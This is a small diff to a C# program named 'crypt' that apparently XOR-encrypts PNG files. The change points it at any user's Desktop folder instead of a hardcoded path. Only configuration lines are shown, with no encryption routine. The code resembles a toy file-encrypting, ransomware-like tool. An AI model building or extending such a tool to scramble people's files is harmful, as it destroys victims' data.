@@ -8,7 +8,7 @@ namespace crypt
     {
         static byte xorNumber = 145;
 
-        static string cryptFrom = @"C:\Users\user\Desktop";
+        static string cryptFrom = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
         static string filePattern = "*.png";
 
         static void Main(string[] args)
